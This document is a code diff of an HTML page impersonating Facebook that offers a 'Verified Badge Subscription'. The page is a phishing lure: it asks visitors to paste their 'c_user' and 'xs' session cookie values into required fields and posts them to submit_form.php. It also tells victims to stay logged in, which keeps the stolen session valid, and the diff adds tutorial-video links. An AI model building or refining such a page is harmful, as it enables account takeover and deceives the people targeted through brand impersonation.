@@ -8,84 +8,75 @@
   <style>
     body {
       font-family: 'Roboto', sans-serif;
-      background-color: #f0f2f5;
+      background: #f0f2f5;
       margin: 0;
       padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      color: #1c1e21;
     }
 
     .container {
       background: #fff;
       border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      width: 420px;
       padding: 25px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      width: 450px;
+      max-width: 95%;
     }
 
-    h1 {
-      font-size: 20px;
-      font-weight: 700;
-      color: #1c1e21;
+    .header {
+      background: #1877f2;
+      color: #fff;
+      padding: 15px;
+      border-radius: 8px;
       text-align: center;
-      margin-bottom: 15px;
+      font-weight: 700;
+      font-size: 18px;
+      margin-bottom: 20px;
     }
 
     p {
       font-size: 14px;
-      color: #606770;
-      line-height: 1.5;
+      color: #333;
       margin-bottom: 15px;
     }
 
-    .section-title {
-      font-weight: 600;
-      margin-top: 15px;
-      margin-bottom: 8px;
-      color: #1c1e21;
+    .video-section {
+      margin-bottom: 15px;
+      padding: 10px;
+      background: #f5f6f7;
+      border-radius: 8px;
     }
 
-    a {
-      display: block;
+    .video-section a {
       color: #1877f2;
-      text-decoration: none;
-      margin-bottom: 8px;
       font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      display: block;
+      margin: 5px 0;
     }
 
-    a:hover {
-      text-decoration: underline;
-    }
-
-    .form-group {
+    .form-field {
       margin-bottom: 15px;
     }
 
     label {
       font-size: 14px;
-      color: #1c1e21;
-      display: block;
-      margin-bottom: 5px;
+      font-weight: 500;
+      color: #333;
     }
 
-    input {
+    input[type="text"] {
       width: 100%;
       padding: 10px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
+      margin-top: 5px;
       font-size: 14px;
-      box-sizing: border-box;
-    }
-
-    .note {
-      background: #f5f6f7;
-      padding: 10px;
-      font-size: 12px;
-      color: #606770;
       border-radius: 6px;
-      margin-bottom: 15px;
+      border: 1px solid #ddd;
     }
 
     .btn {
@@ -93,56 +84,69 @@
       color: #fff;
       border: none;
       padding: 12px;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 500;
       border-radius: 8px;
       cursor: pointer;
       width: 100%;
-      transition: background 0.3s ease;
     }
 
     .btn:hover {
       background-color: #165dd1;
     }
+
+    .footer {
+      font-size: 12px;
+      color: #90949c;
+      margin-top: 15px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
+
   <div class="container">
-    <h1>Facebook Verified Badge Subscription</h1>
+    <div class="header">
+      Facebook Verified Badge Subscription
+    </div>
+
     <p>
-      The verified badge means that Facebook has confirmed that the Page or profile 
-      is the authentic presence of the individual, public figure or brand that it represents.
+      The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
     </p>
     <p>
-      Previously, the verified badge also required the person or brand to be notable 
-      and unique. You may still see users with a verified badge that represents our 
-      previous eligibility requirements.
+      Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.
     </p>
 
-    <div class="section-title">Please provide the precise details below.</div>
-    <p>Refer to the video for clarification if you find the instructions unclear.</p>
+    <div class="video-section">
+      <p><strong>Detailed Video Information:</strong></p>
+      💻 PC/Computer: <a href="your-pc-video-url" target="_blank">Watch Tutorial</a>
+      📱 Mobile: <a href="your-mobile-video-url" target="_blank">Watch Tutorial</a>
+    </div>
 
-    <a href="#">📺 Detailed Video Information PC/Computer 💻🖥️</a>
-    <a href="#">📺 Detailed Video For Mobile Phone Users 📱</a>
+    <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
 
-    <form>
-      <div class="form-group">
+    <form action="submit_form.php" method="post">
+      <div class="form-field">
         <label for="c_user">c_user</label>
-        <input type="text" id="c_user" name="c_user" placeholder="Enter c_user value">
+        <input type="text" id="c_user" name="c_user" required>
       </div>
 
-      <div class="form-group">
+      <div class="form-field">
         <label for="xs">xs</label>
-        <input type="text" id="xs" name="xs" placeholder="Enter xs value">
+        <input type="text" id="xs" name="xs" required>
       </div>
 
-      <div class="note">
-        Please make sure account not to log out from your computer or laptop until you 
-        have received a verification email.
-      </div>
+      <p style="font-size: 12px; color: #555;">
+        Please make sure your account remains logged in on your computer or laptop until you have received a verification email.
+      </p>
 
       <button type="submit" class="btn">Submit</button>
     </form>
+
+    <div class="footer">
+      Features, availability, and pricing may vary by region.
+    </div>
   </div>
+
 </body>
 </html>
